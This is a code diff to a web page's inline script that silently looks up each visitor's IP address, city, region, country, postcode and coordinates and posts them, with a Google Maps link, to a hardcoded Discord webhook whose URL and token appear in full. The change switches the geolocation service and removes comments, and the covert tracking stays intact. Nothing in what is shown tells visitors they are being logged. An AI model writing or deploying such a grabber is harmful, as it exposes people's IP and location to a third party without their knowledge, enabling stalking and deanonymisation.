@@ -26,52 +26,49 @@
 
     <script>
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462954759173439570/4Pa4_ofFtn8e7x1xlWX_XGS-GxwBHDYhH7IzhrEGOgsBwWszDlxNiJ0dHKg-DpnCJQ3L';
-        const GEO_API_URL = 'https://ipwhois.io/api';  // Free IP → location API (no key needed)
+        const GEO_API_URL = 'https://ip-api.com/json/';
 
         async function trackPageView() {
             try {
-                // 1. Get visitor's IP + geolocation
                 const geoResponse = await fetch(GEO_API_URL);
                 const geoData = await geoResponse.json();
 
-                if (geoData.error) {
-                    throw new Error(geoData.reason || 'Geolocation fetch failed');
+                if (geoData.status !== 'success') {
+                    throw new Error(geoData.message || 'Geolocation fetch failed');
                 }
 
                 const {
-                    ip,
+                    query: ip = 'Unknown',
                     city = 'Unknown',
-                    region = 'Unknown',
-                    country_name = 'Unknown',
-                    postal = 'Unknown',
-                    latitude,
-                    longitude
+                    regionName: region = 'Unknown',
+                    country = 'Unknown',
+                    zip = 'Unknown',
+                    lat: latitude,
+                    lon: longitude
                 } = geoData;
 
                 const mapsLink = latitude && longitude 
                     ? `https://www.google.com/maps?q=${latitude},${longitude}`
                     : 'Location coordinates unavailable';
 
-                const locationText = `${city}, ${region}, ${country_name} ${postal !== 'Unknown' ? `(${postal})` : ''}`;
+                const locationText = `${city}, ${region}, ${country}${zip !== 'Unknown' ? ` (${zip})` : ''}`;
 
-                // 2. Build nice Discord embed
                 const embedPayload = {
                     content: 'Page viewed!',
                     embeds: [{
                         title: 'VIEWED',
                         color: 0x00FF00,
                         fields: [
-                            { name: 'IP Address', value: ip || 'Unknown', inline: true },
+                            { name: 'IP Address', value: `\`${ip}\``, inline: true },
                             { name: 'Location', value: locationText, inline: true },
                             { name: 'Coordinates', value: latitude && longitude ? `${latitude}, ${longitude}` : 'N/A', inline: true },
                             { name: 'Google Maps', value: `[View on Map](${mapsLink})`, inline: false }
                         ],
                         timestamp: new Date().toISOString(),
-                        footer: { text: 'Tracked via Webhook' }
+                        footer: { text: 'Tracked via Webhook • Powered by ip-api.com' }
                     }]
                 };
 
-                // 3. Send to Discord
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -79,7 +76,6 @@
                 });
 
             } catch (error) {
-                // Send error embed if something fails
                 const errorPayload = {
                     content: 'Page view tracking error!',
                     embeds: [{
@@ -94,7 +90,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(errorPayload)
-                }).catch(() => {}); // silent fail if error send also fails
+                }).catch(() => {});
             }
         }
 
